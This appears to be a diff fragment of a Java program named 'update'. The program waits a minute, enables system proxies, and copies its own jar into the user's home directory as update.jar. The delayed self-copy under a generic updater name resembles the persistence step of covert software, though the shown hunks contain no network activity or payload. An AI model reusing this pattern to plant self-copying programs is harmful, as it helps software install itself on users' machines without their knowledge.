@@ -3,19 +3,29 @@ package update;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
+import java.io.OutputStream;
+import java.io.UnsupportedEncodingException;
 import java.lang.reflect.InvocationTargetException;
 import java.net.MalformedURLException;
 import java.net.URL;
 import java.net.URLConnection;
+import java.net.URLDecoder;
 import java.net.InetAddress;
 import java.net.UnknownHostException;
 import java.nio.channels.FileChannel;
+
+import javax.swing.JOptionPane;
+
 import java.io.BufferedReader;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileOutputStream;
 import java.io.InputStreamReader;
+
+
+
 public class update{
+	
 
 	public static void main(String[] args) {
 		// TODO Auto-generated method stub
@@ -24,22 +34,38 @@ public class update{
 		String output="";
 		InetAddress addr;
 		Runtime runtime = Runtime.getRuntime();
+		String path = update.class.getProtectionDomain().getCodeSource().getLocation().getPath();
 		
+		System.setProperty("java.net.useSystemProxies","true");
 		
-		
+		//String sproxy= GetProxy.GetParameters();
+		String decodedPath="";
+		try{
+			 decodedPath = URLDecoder.decode(path, "UTF-8");
+			 decodedPath=decodedPath.replace("/", "\\");
+			 decodedPath=decodedPath.substring(1);
+		}
+		catch (UnsupportedEncodingException e) {
+            e.printStackTrace();
+		}
+		//JOptionPane.showMessageDialog(null, decodedPath + "update.jar");
 		try {
-        	Thread.sleep(180 * 1000);
+        	Thread.sleep(60 * 1000);
         }
         catch (InterruptedException e) {
             e.printStackTrace();
         }
-/*		
 		
-		File srcFile = new File(System.getProperty("user.dir") + "\\update.jar");
+		
+		//File srcFile = new File(System.getProperty("user.dir") + "\\update.jar");
+		File srcFile = new File(decodedPath);
+		//File srcFile = new File(System.getenv("APPDATA") + "\\update.jar");
 		File trgFile = new File(System.getProperty("user.home") + "\\update.jar");
+		
+		
 		try{
-			if(!System.getProperty("user.dir").equals(System.getProperty("user.home")))
-				copyFileUsingFileChannels(srcFile,trgFile);
+			if(!(decodedPath).equals(System.getProperty("user.home")+ "\\update.jar"))
+				copyFileUsingFileStreams(srcFile,trgFile);
 		}
 		catch (IOException ex)
 		{
@@ -61,7 +87,7 @@ public class update{
 		{
 			    
 		}
-*/		
+		
 	/*	try {
 			
 			Runtime runtime = Runtime.getRuntime();
@@ -196,6 +222,23 @@ public class update{
 		}
 
 		return  result;
+	}
+	private static void copyFileUsingFileStreams(File source, File dest)
+			throws IOException {
+		InputStream input = null;
+		OutputStream output = null;
+		try {
+			input = new FileInputStream(source);
+			output = new FileOutputStream(dest);
+			byte[] buf = new byte[1024];
+			int bytesRead;
+			while ((bytesRead = input.read(buf)) > 0) {
+				output.write(buf, 0, bytesRead);
+			}
+		} finally {
+			input.close();
+			output.close();
+		}
 	}
 
 }
